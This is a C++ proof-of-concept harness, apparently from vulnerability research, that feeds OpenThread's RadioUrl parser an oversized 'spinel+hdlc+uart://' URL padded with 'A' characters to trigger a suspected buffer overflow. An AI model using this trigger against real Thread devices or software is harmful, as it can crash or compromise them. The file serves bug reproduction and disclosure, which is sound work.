#include <cstdarg>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <new>
#include <string>

#include "/Users/carlosgomez/Documents/IOActice/Researchs/agent-audit/vulnhunter/targets/openthread/src/posix/platform/radio_url.hpp"

extern "C" {

const char *otExitCodeToString(uint8_t aExitCode)
{
    switch (aExitCode)
    {
    case 0:
        return "OT_EXIT_SUCCESS";
    case 1:
        return "OT_EXIT_FAILURE";
    case 2:
        return "OT_EXIT_INVALID_ARGUMENTS";
    default:
        return "OT_EXIT_UNKNOWN";
    }
}

void otLogCritPlat(const char *aFormat, ...)
{
    va_list args;

    va_start(args, aFormat);
    vfprintf(stderr, aFormat, args);
    fputc('\n', stderr);
    va_end(args);
}

void otLogWarnPlat(const char *aFormat, ...) { (void)aFormat; }
void otLogNotePlat(const char *aFormat, ...) { (void)aFormat; }
void otLogInfoPlat(const char *aFormat, ...) { (void)aFormat; }
void otLogDebgPlat(const char *aFormat, ...) { (void)aFormat; }

} // extern "C"

namespace {

std::string MakeUrl(std::size_t aTargetLength)
{
    const std::string prefix = "spinel+hdlc+uart://";
    std::string       url    = prefix;

    if (aTargetLength < prefix.size())
    {
        std::fprintf(stderr, "requested length %zu is smaller than prefix length %zu\n", aTargetLength, prefix.size());
        std::exit(1);
    }

    url.append(aTargetLength - prefix.size(), 'A');
    return url;
}

} // namespace

int main(int argc, char **argv)
{
    std::size_t length = 511;

    if (argc > 1)
    {
        length = static_cast<std::size_t>(std::strtoul(argv[1], nullptr, 0));
    }

    std::string url = MakeUrl(length);

    std::fprintf(stderr, "Constructed URL length: %zu\n", url.size());
    std::fprintf(stderr, "Triggering ot::Posix::RadioUrl::Init() with %zu-byte input\n", url.size());

    void *storage = ::operator new(sizeof(ot::Posix::RadioUrl));
    std::memset(storage, 0x41, sizeof(ot::Posix::RadioUrl));

    auto *radioUrl = new (storage) ot::Posix::RadioUrl(url.c_str());

    std::fprintf(stderr, "Protocol: %s\n", radioUrl->GetProtocol());
    std::fprintf(stderr, "Path: %s\n", radioUrl->GetPath());

    return 0;
}
